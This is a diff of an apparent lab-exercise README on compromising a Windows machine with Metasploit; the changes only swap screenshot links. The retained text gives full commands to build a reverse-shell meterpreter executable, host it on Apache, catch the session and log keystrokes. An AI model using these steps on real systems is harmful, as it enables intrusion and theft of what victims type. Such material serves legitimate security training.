@@ -24,40 +24,34 @@ Open terminal and try execute some kali linux commands
 ## PROGRAM:
 
 Find the attackers ip address using ifconfig
+
 ## OUTPUT:
-![s](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/d9b9e488-6580-4969-a3d2-5061443c0ed1)
 
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/00d146f1-d14e-4a64-a67a-e53e332e4444)
 
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+
 ## OUTPUT
-![1](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/12b58fda-5cec-4e47-872b-b838ef920d46)
 
-
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/1e780f98-06c9-4209-b0ec-b199a06ce3d2)
 
 copy the fun.exe into the apache /var/www/html folder
-![2](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/37d7e507-5d47-4ddb-ba93-586f6d73a51b)
 
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/656645e6-c6b7-43d5-a97d-55b900d4d2ba)
 
 Start apache server
 sudo systemctl apache2 start
 
-![3](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/0d0224f9-d80c-42b9-a3ab-09b48da66a27)
-
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/dcb3068a-0fcc-487f-9a30-0e02e23d0c6d)
 
 Check the status of apache2
-![4](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/77516604-9c4f-4317-a188-c41de4625542)
 
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/000fec71-9333-4adc-aba4-cd4b8f0d1359)
 
 Invoke msfconsole:
+
 ## OUTPUT:
-
-
-
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
@@ -67,21 +61,20 @@ use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 exploit
-![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)
 
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/4262f49d-cd4f-4176-94a9-a88a008a3c52)
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
-![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)
 
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/a0414548-f155-4214-9c74-544372608050)
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 
 On kali give the command exploit
-![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/fee0700e-bafd-4e76-af72-f5ac23a5d6ba)
 
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/d5051c2d-f1ae-4b9a-8e9a-e299d813ad0e)
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
@@ -96,20 +89,18 @@ at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
-![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)
 
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/2a95ff8e-03a7-46bd-a872-069bdc67fc04)
 
 Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-![9](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/85fb473c-59fe-4042-b163-552fddc735d1)
 
-
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/19f0c973-5ac5-452e-bd91-1e9f32848b53)
 
 keyscan_dump	Shows the keystrokes captured so far
-![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)
 
+![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/4363554a-91a9-4abf-8aae-031462b6aa69)
 
 
 ## RESULT:
